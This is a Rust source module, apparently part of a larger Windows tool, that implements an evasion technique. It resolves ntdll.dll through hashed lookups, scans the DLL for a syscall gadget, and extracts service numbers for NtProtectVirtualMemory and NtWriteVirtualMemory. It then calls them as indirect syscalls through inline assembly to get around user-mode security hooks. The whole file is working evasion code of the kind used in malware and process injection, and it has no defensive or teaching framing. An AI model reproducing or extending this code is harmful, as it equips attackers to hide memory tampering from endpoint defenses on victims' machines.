use std::ffi::c_void;
use crate::recovery::helpers::dynamic_api::{get_module_base, get_proc_address, djb2_hash, NTDLL_HASH};
use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};

#[repr(C)]
struct SyscallStub {
    ssn: u32,
    address: *const c_void,
}

pub struct SyscallManager {
    pub nt_protect_virtual_memory_ssn: u32,
    #[allow(dead_code)]
    pub nt_write_virtual_memory_ssn: u32,
    pub syscall_gadget: *const c_void,
}

impl SyscallManager {
    pub fn new() -> Result<Self, String> {
        let h_ntdll = unsafe { get_module_base(NTDLL_HASH) };
        if h_ntdll.is_null() {
            return Err("Failed to find ntdll.dll".to_string());
        }

        let syscall_gadget = find_syscall_gadget(h_ntdll as *const u8)?;

        // Hashes for NtProtectVirtualMemory and NtWriteVirtualMemory
        let nt_protect = resolve_syscall(h_ntdll as *const u8, djb2_hash("NtProtectVirtualMemory"))?;
        let nt_write = resolve_syscall(h_ntdll as *const u8, djb2_hash("NtWriteVirtualMemory"))?;

        Ok(Self {
            nt_protect_virtual_memory_ssn: nt_protect.ssn,
            nt_write_virtual_memory_ssn: nt_write.ssn,
            syscall_gadget,
        })
    }
}

fn find_syscall_gadget(ntdll_base: *const u8) -> Result<*const c_void, String> {
    unsafe {
        let dos_header = &*(ntdll_base as *const IMAGE_DOS_HEADER);
        let nt_headers =
            &*(ntdll_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        let size_of_image = nt_headers.optional_header.size_of_image as usize;

        for i in 0..(size_of_image - 2) {
            let ptr = ntdll_base.add(i);
            if *ptr == 0x0F && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xC3 {
                return Ok(ptr as *const c_void);
            }
        }
    }
    Err("Failed to find syscall gadget".to_string())
}

fn resolve_syscall(ntdll_base: *const u8, function_hash: u32) -> Result<SyscallStub, String> {
    let address = unsafe { get_proc_address(ntdll_base as *mut c_void, function_hash) };
    if address.is_null() {
        return Err(format!("Failed to find function with hash 0x{:X}", function_hash));
    }
    let addr = address as *const u8;

    unsafe {
        for i in 0..32 {
            if *addr.add(i) == 0xB8 {
                let ssn = *(addr.add(i + 1) as *const u32);
                return Ok(SyscallStub {
                    ssn,
                    address: addr as _,
                });
            }
        }
    }
    Err(format!("Failed to extract SSN for function with hash 0x{:X}", function_hash))
}

#[cfg(target_arch = "x86_64")]
pub unsafe fn indirect_syscall_5(
    ssn: u32,
    gadget: *const c_void,
    a1: isize,
    a2: isize,
    a3: isize,
    a4: isize,
    a5: isize,
) -> i32 {
    let mut status: i32;
    unsafe {
        std::arch::asm!(
            "sub rsp, 0x28",
            "mov [rsp + 0x20], {arg5}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x28",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            arg5 = in(reg) a5,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            out("rax") status,
        );
    }
    status
}
